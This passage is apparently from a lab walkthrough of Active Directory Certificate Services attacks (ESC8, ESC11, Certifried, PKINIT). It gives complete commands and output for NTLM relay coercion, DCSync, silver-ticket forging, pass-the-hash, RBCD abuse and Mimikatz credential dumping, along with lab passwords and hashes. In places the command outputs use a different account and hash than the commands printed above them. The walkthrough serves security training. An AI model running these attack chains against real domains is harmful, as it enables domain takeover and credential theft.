krbtgt:aes128-cts-hmac-sha1-96:6b7f721527132e164898a64117fef78b
krbtgt:des-cbc-md5:e98964266db962d9
[*] Cleaning up...
```

Answer: `fc9b9cb697c498cdce57e0566075435e`

# ESC8

## Question 2

### "On the Domain Controller, what is the value of the flag file at C:\\Users\\Administrator\\Desktop\\flag.txt?"

Utilizing the previously attained TGT of `lab-dc$`, students need to perform a `DCSync` attack with `secretsdump.py`, specifying the user `administrator` for the `-just-dc-user` option; students will discover that the `administrator`'s NT hash is `6e599ada28db049c044cc0bb4afeb73d`:

Code: shell

```shell
KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local -just-dc-user administrator
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local -just-dc-user administrator

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
lab.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:6e599ada28db049c044cc0bb4afeb73d:::
[*] Kerberos keys grabbed
lab.local\Administrator:aes256-cts-hmac-sha1-96:15fea01cd40e5da11d44c8c337e4091e3bfcdb0cc173074a7a102519820476d1
lab.local\Administrator:aes128-cts-hmac-sha1-96:25d4103e2d10489d00a3b68860612fa0
lab.local\Administrator:des-cbc-md5:70408a1313161c0b
[*] Cleaning up...
```

At last, students need to `pass-the-hash` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{PR1V1l3DGE_W17H_RELAY}`:

Code: shell

```shell
wmiexec.py -no-pass -hashes :6e599ada28db049c044cc0bb4afeb73d administrator@lab-dc.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```

```
root@ubuntu:/home/htb-student# wmiexec.py -no-pass -hashes :6e599ada28db049c044cc0bb4afeb73d administrator@lab-dc.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
HTB{PR1V1l3DGE_W17H_RELAY}
```

Answer: `HTB{PR1V1l3DGE_W17H_RELAY}`

# ESC11

## Question 1

### "Use the credentials of blwasp@lab.local (blwasp:Password123!) to abuse the ESC11 misconfiguration and compromise WS01. Submit the content of the flag at C:\\Users\\Administrator\\Desktop\\flag.txt."

After spawning the target machine, students need to connect to it with SSH, passing the password `HTB_@cademy_stdnt!` with `sshpass` (it is important to set the `-oStrictHostKeyChecking` option to `accept-new`, which allows SSH to automatically add new host keys to the user's known hosts files):

Code: shell

```shell
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@STMIP -oStrictHostKeyChecking=accept-new
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-jyuiquw0eq]─[~]
└──╼ [★]$ sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.205.205 -oStrictHostKeyChecking=accept-new

Warning: Permanently added '10.129.205.205' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-155-generic x86_64)
<SNIP>
$ 
```

Students then need to spawn a `bash` shell as root (instead of the default `sh` one):

Code: shell

```shell
sudo bash
```

```
$ sudo bash

[sudo] password for htb-student: 
root@ubuntu:/home/htb-student#
```

Moreover, students need to check the contents of `/etc/hosts` to find vHost entries for the hosts within the target's internal network:

Code: shell

```shell
cat /etc/hosts
```

```
root@ubuntu:/home/htb-student# cat /etc/hosts

<SNIP>

172.16.19.3	lab-dc lab-dc.lab.local	lab.local
172.16.19.5	ws01.lab.local	ws01
<SNIP>
```

When using `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities utilizing the credentials `blwasp@lab.local:Password123!`, students will discover that the CA suffers from `ESC11` (and `ESC8`):

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip 172.16.19.3 -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-jyuiquw0eq]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 172.16.19.3 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'lab-WS01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'lab-WS01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'lab-WS01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'lab-WS01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    Certificate Serial Number           : 238F549429FFF796430B5F486159490B
    Certificate Validity Start          : 2023-07-06 09:44:47+00:00
    Certificate Validity End            : 2122-07-06 09:54:47+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
Certificate Templates                   : [!] Could not find any certificate templates
```

Before abusing `ESC11`, students need to start a new `tmux` session to allow multiple panes usage (students can split panes vertically using the key combination `Ctrl` + `b` + `%` (or `"` for a horizontal split)):

Code: shell

```shell
tmux new -s ESC11
```

```
root@ubuntu:/home/htb-student# tmux new -s ESC11
```

To abuse `ESC11`, students first need to, in one pane, use the `relay` command of `certipy`, specifying the `rpc` scheme and the IP address of the DC `172.16.19.5` for the `-target` option and the `DomainController` template for the `-template` option:

Code: shell

```shell
certipy relay -target rpc://172.16.19.5 -ca lab-WS01-CA -template DomainController
```

```
root@ubuntu:/home/htb-student# certipy relay -target rpc://172.16.19.5 -ca lab-WS01-CA -template DomainController

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
```

In another pane, students need to, utilizing the credentials `blwasp:Password123!`, use `PetitPotam.py` (or [coercer](https://github.com/p0dalirius/Coercer)) to coerce `172.16.19.3`/`lab-dc` into performing `SMB` `NTLM` authentication against `172.16.19.19` and have `coercer` relay it over `RPC`/`ICPR` to `172.16.19.5` (which is one type of `NTLM` `cross-protocol relay attacks`):

Code: shell

```shell
python3 PetitPotam/PetitPotam.py -u blwasp -p Password123! -d lab.local 172.16.19.19 172.16.19.3
```

```
root@ubuntu:/home/htb-student# python3 PetitPotam/PetitPotam.py -u blwasp -p Password123! -d lab.local 172.16.19.19 172.16.19.3
   
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _\` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-'"\`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.19.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

When checking the tab with `certipy`, students will notice that a `PFX` certificate for the machine account `LAB-DC$` has been attained:

```
[*] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding
[*] Attacking user 'LAB-DC$@DC'
[*] Requesting certificate for user 'LAB-DC$' with template 'DomainController'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with DNS Host Name 'lab-dc.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lab-dc.pfx'
[*] Exiting...
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `lab-dc$` and `Un-PAC-the-hash` within it; students will attain the NT hash of `lab-dc$`:

Code: shell

```shell
certipy auth -pfx lab-dc.pfx
```

```
root@ubuntu:/home/htb-student# certipy auth -pfx lab-dc.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: lab-dc$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'lab-dc.ccache'
[*] Trying to retrieve NT hash for 'lab-dc$'
[*] Got hash for 'lab-dc$@lab.local': aad3b435b51404eeaad3b435b51404ee:eb040dcf98cf41a3914d9acbad72181c
```

Afterward, students need to use the TGT to perform a `DCSync` attack with `secretsdump.py`, specifying the machine account `ws01$` for the `-just-dc-user` option:

Code: shell

```shell
KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local -just-dc-user ws01$
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local -just-dc-user ws01$

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
WS01$:1105:aad3b435b51404eeaad3b435b51404ee:b165236e4efbaa9371f67a29689e2835:::
[*] Kerberos keys grabbed
WS01$:aes256-cts-hmac-sha1-96:dfed234dd214bf0d5f15d3bfb51723b6c5f9258de4142968119ea5a1bf7266de
WS01$:aes128-cts-hmac-sha1-96:e22a71f3610c2adb8289433029ef089e
WS01$:des-cbc-md5:8cfe8667c8a7da3b
[*] Cleaning up...
```

With the NT hash of `ws01$` attained, students then need to query the DC/`lab-dc.lab.local` with `lookupsid.py` to get the SID of the domain, finding it to be `S-1-5-21-1817219280-1014233819-995920665`:

Code: shell

```shell
lookupsid.py 'ws01$'@lab-dc.lab.local -hashes :b165236e4efbaa9371f67a29689e2835
```

```
root@ubuntu:/home/htb-student# lookupsid.py 'Administrator'@lab-dc.lab.local -hashes :6e599ada28db049c044cc0bb4afeb73d

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at lab-dc.lab.local
[*] StringBinding ncacn_np:lab-dc.lab.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1817219280-1014233819-995920665
<SNIP>
```

Subsequently, students need to utilize `ticketer.py` to forge a silver ticket as `Administrator` on `WS01.lab.local`, specifying the NT hash of `ws01$` for the `-nthash` option, the domain SID for the `-domain-sid` option, `lab.local` for the `-domain` option, and `cifs/ws01.lab.local` for the `spn` option:

Code: shell

```shell
ticketer.py -nthash b165236e4efbaa9371f67a29689e2835 -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/ws01.lab.local Administrator
```

```
root@ubuntu:/home/htb-student# ticketer.py -nthash 6e599ada28db049c044cc0bb4afeb73d -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/ws01.lab.local Administrator

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

At last, students need to `pass-the-ticket` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{C3R7IFICATE_ABU53}`:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass ws01.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass ws01.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
HTB{C3R7IFICATE_ABU53}
```

Answer: `HTB{C3R7IFICATE_ABU53}`

# ESC11

## Question 2

### "Extract all credentials from WS01. What is the local Administrator account's NT hash?"

Utilizing the previously attained silver ticket, students need to `pass-the-ticket` with `wmiexec.py` to establish a shell on `ws01.lab.local` as `Administrator`:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass ws01.lab.local
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass ws01.lab.local

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab.local\administrator
```

Subsequently, students need to navigate to `C:\Tools` and run `Mimikatz`, utilizing `lsadump::sam` to dump the SAM; students will find that the local `Administrator`'s hash is `e1451fa7e5d10566074187fad7e8fe63`:

Code: shell

```shell
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

```
C:\Tools>.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : WS01
SysKey : debb92e5be1f4622f395a06f9bc02caa
Local SID : S-1-5-21-2019640346-3252826612-2241870202

SAMKey : 1ee2331e0a85d7f726282f03e4e943a4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e1451fa7e5d10566074187fad7e8fe63
    lm  - 0: e6f4dd9004aa23b4eb139c16a7e6ef99
    ntlm- 0: e1451fa7e5d10566074187fad7e8fe63
    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
```

Alternatively, students can `pass-the-ticket` with `secretsdump.py` to dump the SAM on `ws01.lab.local`:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass ws01.lab.local
```

```
root@ubuntu:/home/htb-student# KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass ws01.lab.local

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdebb92e5be1f4622f395a06f9bc02caa
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1451fa7e5d10566074187fad7e8fe63:::
<SNIP>
```

Answer: `e1451fa7e5d10566074187fad7e8fe63`

# Certifried (CVE-2022-26923)

## Question 1

### "Exploit the Certifried vulnerability. What is the value of the flag file at C:\\Users\\Administrator\\Desktop\\flag.txt?"

After spawning the target machine, students will find out that when requesting a certificate using the credentials `blwasp:Password123!` and the `User` template, `certipy` reports that the certificate has no `object SID`, implying that the CA does not perform strong mapping:

Code: shell

```shell
certipy req -u blwasp -p Password123! -ca lab-LAB-DC-CA -dc-ip STMIP -template User
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-3fzx2c5qi9]─[~]
└──╼ [★]$ certipy req -u blwasp -p Password123! -ca lab-LAB-DC-CA -dc-ip 10.129.228.237 -template User

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'blwasp@lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'blwasp.pfx'
```

Before abusing `Certifried`, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `DC02.lab.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA dc02.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.237 lab.local lab-LAB-DC-CA dc02.lab.local" >> /etc/hosts'
```

To abuse `Certifried`, students need to use the `account` command of `certipy` along with the `create` option, specifying an arbitrary machine account name for the `-user` option and `dc02.lab.local` for the `-dns` option:

Code: shell

```shell
certipy account create -u blwasp@lab.local -p Password123! -dc-ip STMIP -user SupportPC01 -dns dc02.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy account create -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.237 -user SupportPC01 -dns DC02.LAB.LOCAL

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : SupportPC01$
    unicodePwd                          : 8WROKadmZUA4Mbly
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/SupportPC01
                                          RestrictedKrbHost/SupportPC01
    dnsHostName                         : DC02.LAB.LOCAL
[*] Successfully created account 'SupportPC01$' with password '8WROKadmZUA4Mbly'
```

Subsequently, students need to use the `req` command of `certipy`, specifying the username and password of the created account for the `-u` and `-p` options, respectively, and the template `Machine` for the `-template` option; students will attain a `PFX` certificate for the `dc02$` user:

Code: shell

```shell
certipy req -u SupportPC01$ -p 8WROKadmZUA4Mbly -ca lab-LAB-DC-CA -template Machine -dc-ip STMIP
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy req -u 'SupportPC01$' -p '8WROKadmZUA4Mbly' -ca lab-LAB-DC-CA -template 'Machine' -dc-ip 10.129.228.237

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with DNS Host Name 'DC02.LAB.LOCAL'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'dc02.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `dc02$` and `Un-PAC-the-hash` within it:

Code: shell

```shell
certipy auth -pfx dc02.pfx
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy auth -pfx dc02.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: dc02$@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc02.ccache'
[*] Trying to retrieve NT hash for 'dc02$'
[*] Got hash for 'dc02$@lab.local': aad3b435b51404eeaad3b435b51404ee:db35f9cf2e343f0795d33aef721a8f9a
```

With the NT hash of `dc02$` attained, students then need to query the DC/`STMIP` with `lookupsid.py` to get the SID of the domain, finding it to be `S-1-5-21-2810262047-4248699891-1002428937`:

Code: shell

```shell
lookupsid.py 'dc02$'@10.129.228.237 -hashes :db35f9cf2e343f0795d33aef721a8f9a
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ lookupsid.py 'dc02$'@10.129.228.237 -hashes :db35f9cf2e343f0795d33aef721a8f9a

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Brute forcing SIDs at 10.129.228.237
[*] StringBinding ncacn_np:10.129.228.237[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2810262047-4248699891-1002428937
<SNIP>
```

Subsequently, students need to utilize `ticketer.py` to forge a silver ticket as `Administrator` on `dc02.lab.local`, specifying the NT hash of `dc02$` for the `-nthash` option, the domain SID for the `-domain-sid` option, `lab.local` for the `-domain` option, and `cifs/dc02.lab.local` for the `spn` option:

Code: shell

```shell
ticketer.py -nthash db35f9cf2e343f0795d33aef721a8f9a -domain-sid S-1-5-21-2810262047-4248699891-1002428937 -domain lab.local -spn cifs/dc02.lab.local Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ ticketer.py -nthash db35f9cf2e343f0795d33aef721a8f9a -domain-sid S-1-5-21-2810262047-4248699891-1002428937 -domain lab.local -spn cifs/dc02.lab.local Administrator

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Students can use another approach to obtain a `ccache` file while impersonating the `Administrator` utilizing `ldap-shell` within `certipy`, add a new computer, and establish a Resource-based Constrained Delegation between the new computer and the domain controller:

Code: shell

```shell
certipy auth -pfx dc02.pfx -dc-ip STMIP -ldap-shell
add_computer ESC1 E$C1
set_rbcd DC02$ ESC1$
exit
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ct4zqxhjcu]─[~]
└──╼ [★]$ certipy auth -pfx dc02.pfx -dc-ip 10.129.140.112 -ldap-shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.140.112:636'
[*] Authenticated to '10.129.140.112' as: u:LAB-DC\DC02$
Type help for list of commands

# add_computer ESC1 E$C1
Attempting to add a new computer with the name: ESC1$
Inferred Domain DN: DC=lab,DC=local
Inferred Domain Name: lab.local
New Computer DN: CN=ESC1,CN=Computers,DC=lab,DC=local
Adding new computer with username: ESC1$ and password: E$C1 result: OK

# set_rbcd DC02$ ESC1$
Found Target DN: CN=DC02,OU=Domain Controllers,DC=lab,DC=local
Target SID: S-1-5-21-2810262047-4248699891-1002428937-1002

Found Grantee DN: CN=ESC1,CN=Computers,DC=lab,DC=local
Grantee SID: S-1-5-21-2810262047-4248699891-1002428937-3604
Delegation rights modified successfully!
ESC1$ can now impersonate users on DC02$ via S4U2Proxy
# exit
Bye!
```

Subsequently, students will request a CIFS service ticket impersonating the Administrator:

Code: shell

```shell
getST.py -spn cifs/dc02.lab.local -impersonate Administrator -dc-ip STMIP 'lab.local/esc1$:E$C1'
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ct4zqxhjcu]─[~]
└──╼ [★]$ getST.py -spn cifs/dc02.lab.local -impersonate Administrator -dc-ip 10.129.140.112 'lab.local/esc1$:E$C1'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

At last, students need to `pass-the-ticket` with `wmiexec.py` and read the contents of the file `C:\Users\Administrator\Desktop\flag.txt` to attain the flag `HTB{C3rT1FRI3D_VULNERABLE}`:

Code: shell

```shell
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass dc02.lab.local "more C:\Users\Administrator\Desktop\flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass dc02.lab.local "more C:\Users\Administrator\Desktop\flag.txt"

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
HTB{C3rT1FRI3D_VULNERABLE}
```

Answer: `HTB{C3rT1FRI3D_VULNERABLE}`

# PKINIT

## Question 1

### "Use one of the explained methods to compromise the target server and submit the content of the flag at C:\\Users\\Administrator\\Desktop\\flag.txt"

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `CorpVPN` template suffers from the `ESC1` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -stdout -vulnerable
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-gtnfio9rtv]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.229.56 -stdout -vulnerable

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificatess              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

However, only `Domain Computers` (in addition to `Domain Admins` and `Enterprise Admins`) can enroll. Therefore, utilizing the credentials `blwasp:Password123!`, students first need to use `addcomputer.py` to add a computer/machine account:

Code: shell

```shell
addcomputer.py authority.htb/blwasp:'Password123!' -method LDAPS -computer-name 'MainOfficePrinter$' -computer-pass 087938752c8c78c4886ff8d340a9492b -dc-ip STMIP
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-gtnfio9rtv]─[~]
└──╼ [★]$ addcomputer.py authority.htb/blwasp:'Password123!' -method LDAPS -computer-name 'MainOfficePrinter$' -computer-pass 087938752c8c78c4886ff8d340a9492b -dc-ip 10.129.124.128

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Successfully added machine account MainOfficePrinter$ with password 087938752c8c78c4886ff8d340a9492b.
```

